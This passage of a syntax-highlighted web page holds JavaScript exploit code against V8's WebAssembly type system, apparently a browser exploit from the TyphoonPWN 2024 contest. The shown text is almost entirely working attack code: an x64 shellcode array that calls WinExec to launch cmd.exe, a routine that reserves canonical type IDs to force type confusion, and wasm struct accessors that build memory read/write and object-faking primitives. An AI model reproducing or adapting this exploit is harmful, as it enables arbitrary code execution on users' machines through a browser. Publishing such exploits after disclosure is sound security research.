          <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">,</span> <span class="token number">0xe5</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span>
          <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xd6</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span>
          <span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0xb9</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span>
          <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token number">0xeb</span><span class="token punctuation">,</span> <span class="token number">0xf4</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>
          <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span>
          <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>
          <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>
          <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x3c</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span>
          <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xcb</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xcb</span><span class="token punctuation">,</span>
          <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x7b</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xcf</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span>
          <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0xc6</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>
          <span class="token number">0x0c</span><span class="token punctuation">,</span> <span class="token number">0xb7</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span>
          <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span>
          <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xc4</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span>
          <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xc6</span><span class="token punctuation">,</span> <span class="token number">0xeb</span><span class="token punctuation">,</span> <span class="token number">0xd4</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>
          <span class="token number">0x7b</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xcf</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x0f</span><span class="token punctuation">,</span> <span class="token number">0xb7</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span>
          <span class="token number">0x7b</span><span class="token punctuation">,</span> <span class="token number">0x1c</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xcf</span><span class="token punctuation">,</span> <span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xb7</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">,</span>
          <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x5e</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x5b</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0x1a</span><span class="token punctuation">,</span>
          <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x0c</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xc1</span><span class="token punctuation">,</span>
          <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xc2</span><span class="token punctuation">,</span> <span class="token number">0xeb</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x0f</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span>
          <span class="token number">0x5b</span><span class="token punctuation">,</span> <span class="token number">0xc3</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x6e</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span>
          <span class="token number">0x6c</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
        cmd <span class="token operator">=</span>
          <span class="token string">'cmd /c "title Pwned! &amp; echo \x1b[4;97mPwned by Seunghyun Lee (Xion, @0x10n), for TyphoonPWN 2024\x1b[0m &amp; echo \x1b[5;96m &amp; echo    /$$$$$$$  /$$      /$$ /$$   /$$ /$$$$$$$$ /$$$$$$$  /$$ &amp; echo   ^| $$__  $$^| $$  /$ ^| $$^| $$$ ^| $$^| $$_____/^| $$__  $$^| $$ &amp; echo   ^| $$  \\ $$^| $$ /$$$^| $$^| $$$$^| $$^| $$      ^| $$  \\ $$^| $$ &amp; echo   ^| $$$$$$$/^| $$/$$ $$ $$^| $$ $$ $$^| $$$$$   ^| $$  ^| $$^| $$ &amp; echo   ^| $$____/ ^| $$$$_  $$$$^| $$  $$$$^| $$__/   ^| $$  ^| $$^|__/ &amp; echo   ^| $$      ^| $$$/ \\  $$$^| $$\\  $$$^| $$      ^| $$  ^| $$     &amp; echo   ^| $$      ^| $$/   \\  $$^| $$ \\  $$^| $$$$$$$$^| $$$$$$$/ /$$ &amp; echo   ^|__/      ^|__/     \\__/^|__/  \\__/^|________/^|_______/ ^|__/ &amp; echo \x1b[0m &amp; cmd"'</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cmd<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          sc<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cmd<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        sc<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// prevent isorecursive group canonicalization merge</span>
        <span class="token keyword">function</span> <span class="token function">encodeTag</span><span class="token punctuation">(</span><span class="token parameter">val<span class="token punctuation">,</span> bitlen <span class="token operator">=</span> <span class="token number">33</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> val
            <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span>bitlen<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span>
              v <span class="token operator">===</span> <span class="token string">"0"</span> <span class="token operator">?</span> <span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI32<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">let</span> reserveCtr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token parameter">cnt</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">const</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token function">encodeTag</span><span class="token punctuation">(</span><span class="token operator">++</span>reserveCtr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cnt <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            builder<span class="token punctuation">.</span><span class="token function">addArray</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//builder.addType(kSig_v_v);</span>
            <span class="token comment">//builder.addStruct([makeField(kWasmI64, true)]);</span>
          <span class="token punctuation">&#125;</span>
          builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// self-ref -> err, halt wasm comp</span>
          builder<span class="token punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">const</span> buf <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">toBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">const</span> _ <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"no crash?????"</span><span class="token punctuation">,</span> reserveCtr<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"forward-declared supertype"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>
                <span class="token string">"[*] Reserved "</span> <span class="token operator">+</span> cnt <span class="token operator">+</span> <span class="token string">" isorecursive canonical type ids"</span>
              <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
              console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"caught wrong exc???"</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> reserveCtr<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">/*
        kFunc = kV8MaxWasmTypes,  // shorthand: c / 1000000
        kEq,                      // shorthand: q / 1000001
        kI31,                     // shorthand: j / 1000002
        kStruct,                  // shorthand: o / 1000003
        kArray,                   // shorthand: g / 1000004
        kAny,                     //              / 1000005 &lt;- any (which is actually a struct) -> type
        kExtern,                  // shorthand: a./ 1000006
    */</span>

        <span class="token comment">// R: int -> int* + read</span>
        <span class="token comment">// W: int -> int* + write</span>
        <span class="token comment">// addrOf: externref -> int</span>
        <span class="token comment">// fakeObj: int -> externref</span>

        <span class="token comment">// kNumberOfPredefinedTypes = 2</span>
        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">1000000</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">0x100000</span> <span class="token operator">-</span> <span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// this two lines can be repeated (filling 20bits)</span>
        <span class="token comment">//reserve(1000000);</span>
        <span class="token comment">//reserve(0x100000 - 1000000);</span>

        <span class="token comment">// 1. create any -> int casting functions</span>
        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">reserve</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> struct <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI32<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI32<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000005 (kAny)</span>
          <span class="token keyword">let</span> funcSig <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>
            <span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">,</span> kWasmI32<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000006</span>
          <span class="token keyword">let</span> funcSig2 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span><span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000007</span>
          builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token function">encodeTag</span><span class="token punctuation">(</span><span class="token number">0x133370000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000008</span>
          builder<span class="token punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          builder
            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"i_init"</span><span class="token punctuation">,</span> funcSig2<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
              kExprI32Const<span class="token punctuation">,</span>
              <span class="token number">0</span><span class="token punctuation">,</span>
              kExprI32Const<span class="token punctuation">,</span>
              <span class="token number">0</span><span class="token punctuation">,</span>
              kGCPrefix<span class="token punctuation">,</span>
              kExprStructNew<span class="token punctuation">,</span>
              struct<span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          builder
            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"i_get0"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">0</span><span class="token punctuation">,</span>
              kGCPrefix<span class="token punctuation">,</span>
              kExprStructGet<span class="token punctuation">,</span>
              struct<span class="token punctuation">,</span>
              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          builder
            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"i_get1"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">0</span><span class="token punctuation">,</span>
              kGCPrefix<span class="token punctuation">,</span>
              kExprStructGet<span class="token punctuation">,</span>
              struct<span class="token punctuation">,</span>
              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          builder
            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"i_set0"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">0</span><span class="token punctuation">,</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">1</span><span class="token punctuation">,</span>
              kGCPrefix<span class="token punctuation">,</span>
              kExprStructSet<span class="token punctuation">,</span>
              struct<span class="token punctuation">,</span>
              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">1</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          builder
            <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"i_set1"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">0</span><span class="token punctuation">,</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">1</span><span class="token punctuation">,</span>
              kGCPrefix<span class="token punctuation">,</span>
              kExprStructSet<span class="token punctuation">,</span>
              struct<span class="token punctuation">,</span>
              <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
              kExprLocalGet<span class="token punctuation">,</span>
              <span class="token number">1</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          <span class="token keyword">let</span> instance <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> wasm <span class="token operator">=</span> instance<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>

          i_init <span class="token operator">=</span> wasm<span class="token punctuation">.</span>i_init<span class="token punctuation">;</span> <span class="token comment">// void -> struct &#123;int, int&#125;</span>
          <span class="token function-variable function">i_get0</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">v</span><span class="token punctuation">)</span> <span class="token operator">=></span> wasm<span class="token punctuation">.</span><span class="token function">i_get0</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// any -> int (ofs 0)</span>
